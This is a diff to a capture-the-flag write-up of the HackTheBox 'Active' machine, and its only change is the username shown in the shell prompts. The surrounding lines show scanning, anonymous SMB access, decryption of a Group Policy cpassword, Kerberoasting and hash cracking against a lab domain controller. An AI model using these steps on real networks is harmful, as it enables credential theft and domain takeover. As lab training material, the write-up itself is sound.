@@ -21,8 +21,8 @@ tags: [windows, active-directory, kerberoasting] # add tag
 Let's start with scanning.
 
 ```terminal
-argenestel@parrot  ~/Desktop/hackthebox/active  rustscan  10.10.10.100  
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+root@parrot  ~/Desktop/hackthebox/active  rustscan  10.10.10.100  o
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
 `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
@@ -129,7 +129,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
 Running Default scripts.
 
 ```bash
-argenestel@parrot  ~/Desktop/hackthebox/active/nmap  cat active                
+root@parrot  ~/Desktop/hackthebox/active/nmap  cat active                
 # Nmap 7.80 scan initiated Sun Nov  1 09:52:53 2020 as: nmap -vvv -p 53,88,135,139,389,445,464,593,636,3269,3268,5722,9389,49152,49153,49154,49155,49157,49158,49169,49172,49182 -sC -sV -oN nmap/active 10.10.10.100
 Nmap scan report for active.htb (10.10.10.100)
 Host is up, received conn-refused (0.25s latency).
@@ -188,7 +188,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 from nmap, the domain is active.htb adding it into /etc/hosts
 ```terminal
 
-argenestel@parrot  ~/Desktop/hackthebox/active  dig 10.10.10.100 @10.10.10.100
+root@parrot  ~/Desktop/hackthebox/active  dig 10.10.10.100 @10.10.10.100
 
 ; <<>> DiG 9.16.6-Debian <<>> 10.10.10.100 @10.10.10.100
 ;; global options: +cmd
@@ -233,7 +233,7 @@ smbmap -H 10.10.10.100
 Reading Replication is possible.
 
 ```bash
-argenestel@parrot  ~/Desktop/hackthebox/active/nmap  smbclient \\\\10.10.10.100/Replication
+root@parrot  ~/Desktop/hackthebox/active/nmap  smbclient \\\\10.10.10.100/Replication
 Enter WORKGROUP\argenestel's password:  
 Anonymous login successful
 Try "help" to get a list of possible commands.
@@ -391,14 +391,14 @@ Okay so I can see cpassword and searching about it, can be decrypted using gpp-d
 #### User SVC_TGS
 
 ```terminal
-argenestel@parrot  ~/Desktop/hackthebox/active/nmap  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+root@parrot  ~/Desktop/hackthebox/active/nmap  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 /usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
 <redacted>
 ```
 
 Here we go moving on to what we can do.
 
-argenestel@parrot  ~/Desktop/hackthebox/active/nmap  smbmap -u SVC_TGS -p <redacted> -H 10.10.10.100             
+root@parrot  ~/Desktop/hackthebox/active/nmap  smbmap -u SVC_TGS -p <redacted> -H 10.10.10.100             
 [+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
@@ -423,7 +423,7 @@ Trying out few random things lead me to this conclusion.
 #### Administrator
 
 ```terminal
-argenestel@parrot  ~/Desktop/hackthebox/active/nmap  GetUserSPNs.py active.htb/SVC_TGS:<redacted> -dc-ip 10.10.10.100 -request
+root@parrot  ~/Desktop/hackthebox/active/nmap  GetUserSPNs.py active.htb/SVC_TGS:<redacted> -dc-ip 10.10.10.100 -request
 /home/argenestel/.local/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer suppo
 rted by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
   from cryptography import x509
@@ -448,7 +448,7 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$0c46bb20097739b1bfe26fee1
 Alright we get krb hash let's check if we can crack it and get administrator
 
 ```bash
-✘ argenestel@parrot  ~/Desktop/hackthebox/active/nmap  john --wordlist=/usr/share/wordlists/rockyou.txt admin.spn  
+✘ root@parrot  ~/Desktop/hackthebox/active/nmap  john --wordlist=/usr/share/wordlists/rockyou.txt admin.spn 
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 4 OpenMP threads
